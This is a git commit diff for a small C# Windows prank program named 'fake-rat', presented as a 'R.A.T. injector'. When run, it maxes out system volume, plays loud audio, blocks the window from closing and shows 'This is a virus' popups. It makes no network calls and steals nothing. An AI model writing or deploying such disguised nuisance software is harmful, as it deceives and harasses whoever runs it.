741a7bcacbb9a16568b05096c539c46ea257601f
Network Assasin <60063675+NetworkAssasin@users.noreply.github.com>
2020-09-13 11:02:32 +0200

    Comments added, minimal interface changes / improvements.

--- fake-rat/Form1.Designer.cs
+++ fake-rat/Form1.Designer.cs
@@ -34,6 +34,7 @@
             this.progressBar1 = new System.Windows.Forms.ProgressBar();
             this.button1 = new System.Windows.Forms.Button();
             this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.label2 = new System.Windows.Forms.Label();
             this.SuspendLayout();
             // 
             // label1
@@ -57,7 +58,7 @@
             // button1
             // 
             this.button1.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.button1.Location = new System.Drawing.Point(308, 1);
+            this.button1.Location = new System.Drawing.Point(297, 12);
             this.button1.Name = "button1";
             this.button1.Size = new System.Drawing.Size(75, 23);
             this.button1.TabIndex = 2;
@@ -69,18 +70,29 @@
             // 
             this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
             // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Consolas", 8F);
+            this.label2.Location = new System.Drawing.Point(12, 9);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(259, 13);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "Remote Administration Tool Injector v0.1.2";
+            // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.ClientSize = new System.Drawing.Size(384, 161);
+            this.Controls.Add(this.label2);
             this.Controls.Add(this.button1);
             this.Controls.Add(this.progressBar1);
             this.Controls.Add(this.label1);
             this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.Name = "Form1";
-            this.Text = "R.A.T. injector";
+            this.Text = "R.A.T. injector v0.1.2";
             this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
             this.Load += new System.EventHandler(this.Form1_Load);
             this.ResumeLayout(false);
@@ -94,6 +106,7 @@
         private System.Windows.Forms.ProgressBar progressBar1;
         private System.Windows.Forms.Button button1;
         private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Label label2;
     }
 }
 
--- fake-rat/Form1.cs
+++ fake-rat/Form1.cs
@@ -8,7 +8,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
-using System.Media;
+using System.Media; 
 
 
 
@@ -16,7 +16,7 @@ namespace fake_rat
 {
     public partial class Form1 : Form
     {
-        private const int APPCOMMAND_VOLUME_UP = 0xA0000;
+        private const int APPCOMMAND_VOLUME_UP = 0xA0000; //Changing volume level
         private const int WM_APPCOMMAND = 0x319;
 
         [DllImport("user32.dll")]
@@ -28,14 +28,14 @@ namespace fake_rat
             InitializeComponent();
         }
 
-        private void Form1_Load(object sender, EventArgs e)
+        private void Form1_Load(object sender, EventArgs e) //Setting the volume to the maximum & the audio file start playing.
         {
             SetMaxVolume();
             StartEarrape();
             this.timer1.Start();
         }
 
-        private void SetMaxVolume()
+        private void SetMaxVolume() 
         {
             for (int i = 0; i < 100; i++)
             {
@@ -46,11 +46,11 @@ namespace fake_rat
 
         private void StartEarrape()
         {
-            SoundPlayer splayer = new SoundPlayer(Properties.Resources.audio);
+            SoundPlayer splayer = new SoundPlayer(Properties.Resources.audio);//Starts playing the audio file & only .WAV audio file is supported in the current release.
             splayer.Play();
         }
 
-        private void timer1_Tick(object sender, EventArgs e)
+        private void timer1_Tick(object sender, EventArgs e) //Progressbar funcion
         {
             this.progressBar1.Increment(1);
             progressBar1.Minimum = 0;
@@ -63,22 +63,24 @@ namespace fake_rat
             }
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        private void button1_Click(object sender, EventArgs e) // Random popups on the screen while closing or trying to shut down the application
         {
 
             SetMaxVolume();
-            MessageBox.Show("EZ NEM JÖTT ÖSSZE");
-            MessageBox.Show("Csúnya dolog kémprogramot rakni az iskolai gépekre! :(");
+            MessageBox.Show("This is a virus");
+            MessageBox.Show("Haha you can't close me :(");
             StartEarrape();
         }
 
-        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e) // Random popups on the screen while closing or trying to shut down the application
         {
             e.Cancel = true;
             SetMaxVolume();
-            MessageBox.Show("EZ NEM JÖTT ÖSSZE");
-            MessageBox.Show("Csúnya dolog kémprogramot rakni az iskolai gépekre! :(");
+            MessageBox.Show("This is a virus");
+            MessageBox.Show("Haha you can't close me, or lover the volume :(");
             StartEarrape();
         }
+
+
     }
 }
